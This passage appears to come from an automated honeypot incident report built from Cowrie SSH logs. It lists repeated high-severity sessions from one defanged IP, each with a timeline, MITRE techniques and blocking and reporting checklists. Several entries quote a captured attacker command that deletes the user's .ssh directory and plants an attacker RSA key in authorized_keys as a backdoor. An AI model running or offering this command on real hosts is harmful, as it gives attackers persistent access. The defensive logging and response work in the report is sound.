| `2026-06-05 13:39:46` | `cowrie.command.failed` |
| `2026-06-05 13:39:47` | `cowrie.log.closed` |
| `2026-06-05 13:39:47` | `cowrie.session.params` |
| `2026-06-05 13:39:47` | `cowrie.command.input` |
| `2026-06-05 13:39:47` | `cowrie.session.file_download` |
| `2026-06-05 13:39:47` | `cowrie.log.closed` |
| `2026-06-05 13:39:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `81.30.212[.]94` to AbuseIPDB if not already reported
- [ ] Block `81.30.212[.]94` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3cdb201d7f12

| Field | Detail |
|---|---|
| **Source IP** | `81.30.212[.]94` |
| **First Seen** | 2026-06-05 13:39 |
| **Last Seen** | 2026-06-05 13:39 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-05 13:39:50` | `cowrie.session.connect` |
| `2026-06-05 13:39:50` | `cowrie.client.version` |
| `2026-06-05 13:39:50` | `cowrie.client.kex` |
| `2026-06-05 13:39:51` | `cowrie.login.success` |
| `2026-06-05 13:39:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `81.30.212[.]94` to AbuseIPDB if not already reported
- [ ] Block `81.30.212[.]94` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3422251e5986

| Field | Detail |
|---|---|
| **Source IP** | `81.30.212[.]94` |
| **First Seen** | 2026-06-05 13:41 |
| **Last Seen** | 2026-06-05 13:41 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-05 13:41:17` | `cowrie.session.connect` |
| `2026-06-05 13:41:17` | `cowrie.client.version` |
| `2026-06-05 13:41:17` | `cowrie.client.kex` |
| `2026-06-05 13:41:18` | `cowrie.login.success` |
| `2026-06-05 13:41:19` | `cowrie.session.params` |
| `2026-06-05 13:41:19` | `cowrie.command.input` |
| `2026-06-05 13:41:19` | `cowrie.command.failed` |
| `2026-06-05 13:41:19` | `cowrie.log.closed` |
| `2026-06-05 13:41:19` | `cowrie.session.params` |
| `2026-06-05 13:41:19` | `cowrie.command.input` |
| `2026-06-05 13:41:19` | `cowrie.session.file_download` |
| `2026-06-05 13:41:19` | `cowrie.log.closed` |
| `2026-06-05 13:41:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `81.30.212[.]94` to AbuseIPDB if not already reported
- [ ] Block `81.30.212[.]94` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-544b8c1eac6d

| Field | Detail |
|---|---|
| **Source IP** | `81.30.212[.]94` |
| **First Seen** | 2026-06-05 13:41 |
| **Last Seen** | 2026-06-05 13:41 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-05 13:41:22` | `cowrie.session.connect` |
| `2026-06-05 13:41:22` | `cowrie.client.version` |
| `2026-06-05 13:41:22` | `cowrie.client.kex` |
| `2026-06-05 13:41:23` | `cowrie.login.success` |
| `2026-06-05 13:41:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `81.30.212[.]94` to AbuseIPDB if not already reported
- [ ] Block `81.30.212[.]94` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3beaf883e0d8

| Field | Detail |
|---|---|
| **Source IP** | `81.30.212[.]94` |
| **First Seen** | 2026-06-05 13:45 |
| **Last Seen** | 2026-06-05 13:45 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-05 13:45:37` | `cowrie.session.connect` |
| `2026-06-05 13:45:37` | `cowrie.client.version` |
| `2026-06-05 13:45:37` | `cowrie.client.kex` |
| `2026-06-05 13:45:38` | `cowrie.login.success` |
| `2026-06-05 13:45:38` | `cowrie.session.params` |
| `2026-06-05 13:45:38` | `cowrie.command.input` |
| `2026-06-05 13:45:38` | `cowrie.command.failed` |
| `2026-06-05 13:45:39` | `cowrie.log.closed` |
| `2026-06-05 13:45:39` | `cowrie.session.params` |
| `2026-06-05 13:45:39` | `cowrie.command.input` |
| `2026-06-05 13:45:39` | `cowrie.session.file_download` |
| `2026-06-05 13:45:39` | `cowrie.log.closed` |
| `2026-06-05 13:45:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `81.30.212[.]94` to AbuseIPDB if not already reported
- [ ] Block `81.30.212[.]94` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2cfbe674b9be

| Field | Detail |
|---|---|
| **Source IP** | `81.30.212[.]94` |
| **First Seen** | 2026-06-05 13:45 |
| **Last Seen** | 2026-06-05 13:45 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-05 13:45:41` | `cowrie.session.connect` |
| `2026-06-05 13:45:41` | `cowrie.client.version` |
| `2026-06-05 13:45:42` | `cowrie.client.kex` |
| `2026-06-05 13:45:42` | `cowrie.login.success` |
| `2026-06-05 13:45:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `81.30.212[.]94` to AbuseIPDB if not already reported
- [ ] Block `81.30.212[.]94` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5a4d33967a44

| Field | Detail |
|---|---|
| **Source IP** | `81.30.212[.]94` |
| **First Seen** | 2026-06-05 13:47 |
| **Last Seen** | 2026-06-05 13:47 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-05 13:47:08` | `cowrie.session.connect` |
| `2026-06-05 13:47:08` | `cowrie.client.version` |
| `2026-06-05 13:47:08` | `cowrie.client.kex` |
| `2026-06-05 13:47:09` | `cowrie.login.success` |
| `2026-06-05 13:47:09` | `cowrie.session.params` |
| `2026-06-05 13:47:09` | `cowrie.command.input` |
| `2026-06-05 13:47:09` | `cowrie.command.failed` |
| `2026-06-05 13:47:09` | `cowrie.log.closed` |
| `2026-06-05 13:47:10` | `cowrie.session.params` |
| `2026-06-05 13:47:10` | `cowrie.command.input` |
| `2026-06-05 13:47:10` | `cowrie.session.file_download` |
| `2026-06-05 13:47:10` | `cowrie.log.closed` |
| `2026-06-05 13:47:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `81.30.212[.]94` to AbuseIPDB if not already reported
- [ ] Block `81.30.212[.]94` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9e638c0089a8

| Field | Detail |
|---|---|
| **Source IP** | `81.30.212[.]94` |
| **First Seen** | 2026-06-05 13:47 |
| **Last Seen** | 2026-06-05 13:47 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-05 13:47:12` | `cowrie.session.connect` |
| `2026-06-05 13:47:12` | `cowrie.client.version` |
| `2026-06-05 13:47:12` | `cowrie.client.kex` |
| `2026-06-05 13:47:13` | `cowrie.login.success` |
| `2026-06-05 13:47:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `81.30.212[.]94` to AbuseIPDB if not already reported
- [ ] Block `81.30.212[.]94` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0fe679d94540

| Field | Detail |
|---|---|
| **Source IP** | `81.30.212[.]94` |
| **First Seen** | 2026-06-05 13:48 |
| **Last Seen** | 2026-06-05 13:48 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-05 13:48:38` | `cowrie.session.connect` |
| `2026-06-05 13:48:38` | `cowrie.client.version` |
| `2026-06-05 13:48:38` | `cowrie.client.kex` |
| `2026-06-05 13:48:38` | `cowrie.login.success` |
| `2026-06-05 13:48:39` | `cowrie.session.params` |
| `2026-06-05 13:48:39` | `cowrie.command.input` |
| `2026-06-05 13:48:39` | `cowrie.command.failed` |
| `2026-06-05 13:48:39` | `cowrie.log.closed` |
| `2026-06-05 13:48:39` | `cowrie.session.params` |
| `2026-06-05 13:48:39` | `cowrie.command.input` |
| `2026-06-05 13:48:40` | `cowrie.session.file_download` |
| `2026-06-05 13:48:40` | `cowrie.log.closed` |
| `2026-06-05 13:48:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `81.30.212[.]94` to AbuseIPDB if not already reported
- [ ] Block `81.30.212[.]94` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6f6f39930bde

| Field | Detail |
|---|---|
| **Source IP** | `81.30.212[.]94` |
| **First Seen** | 2026-06-05 13:48 |
| **Last Seen** | 2026-06-05 13:48 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-05 13:48:42` | `cowrie.session.connect` |
| `2026-06-05 13:48:42` | `cowrie.client.version` |
| `2026-06-05 13:48:42` | `cowrie.client.kex` |
| `2026-06-05 13:48:43` | `cowrie.login.success` |
| `2026-06-05 13:48:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `81.30.212[.]94` to AbuseIPDB if not already reported
- [ ] Block `81.30.212[.]94` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-dfea8fd72717

| Field | Detail |
|---|---|
| **Source IP** | `81.30.212[.]94` |
| **First Seen** | 2026-06-05 13:51 |
| **Last Seen** | 2026-06-05 13:51 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-05 13:51:36` | `cowrie.session.connect` |
| `2026-06-05 13:51:36` | `cowrie.client.version` |
| `2026-06-05 13:51:36` | `cowrie.client.kex` |
| `2026-06-05 13:51:37` | `cowrie.login.success` |
| `2026-06-05 13:51:38` | `cowrie.session.params` |
| `2026-06-05 13:51:38` | `cowrie.command.input` |
| `2026-06-05 13:51:38` | `cowrie.command.failed` |
| `2026-06-05 13:51:38` | `cowrie.log.closed` |
| `2026-06-05 13:51:38` | `cowrie.session.params` |
| `2026-06-05 13:51:38` | `cowrie.command.input` |
| `2026-06-05 13:51:38` | `cowrie.session.file_download` |
| `2026-06-05 13:51:38` | `cowrie.log.closed` |
| `2026-06-05 13:51:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `81.30.212[.]94` to AbuseIPDB if not already reported
- [ ] Block `81.30.212[.]94` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b33ffc535591

| Field | Detail |
|---|---|
| **Source IP** | `81.30.212[.]94` |
| **First Seen** | 2026-06-05 13:51 |
| **Last Seen** | 2026-06-05 13:51 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-05 13:51:41` | `cowrie.session.connect` |
| `2026-06-05 13:51:41` | `cowrie.client.version` |
| `2026-06-05 13:51:41` | `cowrie.client.kex` |
| `2026-06-05 13:51:42` | `cowrie.login.success` |
| `2026-06-05 13:51:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `81.30.212[.]94` to AbuseIPDB if not already reported
- [ ] Block `81.30.212[.]94` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-073490ee818d

| Field | Detail |
|---|---|
| **Source IP** | `81.30.212[.]94` |
| **First Seen** | 2026-06-05 13:54 |
| **Last Seen** | 2026-06-05 13:54 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-05 13:54:42` | `cowrie.session.connect` |
| `2026-06-05 13:54:42` | `cowrie.client.version` |
| `2026-06-05 13:54:42` | `cowrie.client.kex` |
| `2026-06-05 13:54:43` | `cowrie.login.success` |
| `2026-06-05 13:54:43` | `cowrie.session.params` |
| `2026-06-05 13:54:43` | `cowrie.command.input` |
| `2026-06-05 13:54:43` | `cowrie.command.failed` |
| `2026-06-05 13:54:43` | `cowrie.log.closed` |
| `2026-06-05 13:54:44` | `cowrie.session.params` |
| `2026-06-05 13:54:44` | `cowrie.command.input` |
| `2026-06-05 13:54:44` | `cowrie.session.file_download` |
| `2026-06-05 13:54:44` | `cowrie.log.closed` |
| `2026-06-05 13:54:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `81.30.212[.]94` to AbuseIPDB if not already reported
- [ ] Block `81.30.212[.]94` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-28df01851468

| Field | Detail |
|---|---|
| **Source IP** | `81.30.212[.]94` |
| **First Seen** | 2026-06-05 13:54 |
| **Last Seen** | 2026-06-05 13:54 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-05 13:54:46` | `cowrie.session.connect` |
| `2026-06-05 13:54:46` | `cowrie.client.version` |
| `2026-06-05 13:54:47` | `cowrie.client.kex` |
| `2026-06-05 13:54:47` | `cowrie.login.success` |
| `2026-06-05 13:54:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `81.30.212[.]94` to AbuseIPDB if not already reported
- [ ] Block `81.30.212[.]94` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-64c170dee152

| Field | Detail |
|---|---|
| **Source IP** | `81.30.212[.]94` |
| **First Seen** | 2026-06-05 14:02 |
| **Last Seen** | 2026-06-05 14:02 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-05 14:02:01` | `cowrie.session.connect` |
| `2026-06-05 14:02:01` | `cowrie.client.version` |
| `2026-06-05 14:02:01` | `cowrie.client.kex` |
| `2026-06-05 14:02:02` | `cowrie.login.success` |
| `2026-06-05 14:02:02` | `cowrie.session.params` |
| `2026-06-05 14:02:02` | `cowrie.command.input` |
| `2026-06-05 14:02:02` | `cowrie.command.failed` |
| `2026-06-05 14:02:03` | `cowrie.log.closed` |
| `2026-06-05 14:02:03` | `cowrie.session.params` |
| `2026-06-05 14:02:03` | `cowrie.command.input` |
| `2026-06-05 14:02:03` | `cowrie.session.file_download` |
| `2026-06-05 14:02:03` | `cowrie.log.closed` |
| `2026-06-05 14:02:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `81.30.212[.]94` to AbuseIPDB if not already reported
- [ ] Block `81.30.212[.]94` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8c27198e359e

| Field | Detail |
|---|---|
| **Source IP** | `81.30.212[.]94` |
| **First Seen** | 2026-06-05 14:02 |
| **Last Seen** | 2026-06-05 14:02 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-05 14:02:06` | `cowrie.session.connect` |
| `2026-06-05 14:02:06` | `cowrie.client.version` |
| `2026-06-05 14:02:06` | `cowrie.client.kex` |
| `2026-06-05 14:02:07` | `cowrie.login.success` |
| `2026-06-05 14:02:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `81.30.212[.]94` to AbuseIPDB if not already reported
- [ ] Block `81.30.212[.]94` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-dc16fc5ebb87

| Field | Detail |
|---|---|
| **Source IP** | `81.30.212[.]94` |
| **First Seen** | 2026-06-05 14:03 |
| **Last Seen** | 2026-06-05 14:03 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-05 14:03:32` | `cowrie.session.connect` |
| `2026-06-05 14:03:32` | `cowrie.client.version` |
| `2026-06-05 14:03:32` | `cowrie.client.kex` |
| `2026-06-05 14:03:33` | `cowrie.login.success` |
| `2026-06-05 14:03:33` | `cowrie.session.params` |
| `2026-06-05 14:03:33` | `cowrie.command.input` |
| `2026-06-05 14:03:33` | `cowrie.command.failed` |
| `2026-06-05 14:03:34` | `cowrie.log.closed` |
| `2026-06-05 14:03:34` | `cowrie.session.params` |
| `2026-06-05 14:03:34` | `cowrie.command.input` |
| `2026-06-05 14:03:34` | `cowrie.session.file_download` |
| `2026-06-05 14:03:34` | `cowrie.log.closed` |
| `2026-06-05 14:03:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `81.30.212[.]94` to AbuseIPDB if not already reported
- [ ] Block `81.30.212[.]94` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-99e2a8230358

| Field | Detail |
|---|---|
| **Source IP** | `81.30.212[.]94` |
| **First Seen** | 2026-06-05 14:03 |
| **Last Seen** | 2026-06-05 14:03 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-05 14:03:37` | `cowrie.session.connect` |
| `2026-06-05 14:03:37` | `cowrie.client.version` |
| `2026-06-05 14:03:37` | `cowrie.client.kex` |
| `2026-06-05 14:03:37` | `cowrie.login.success` |
| `2026-06-05 14:03:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `81.30.212[.]94` to AbuseIPDB if not already reported
- [ ] Block `81.30.212[.]94` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b1134fb850de

| Field | Detail |
|---|---|
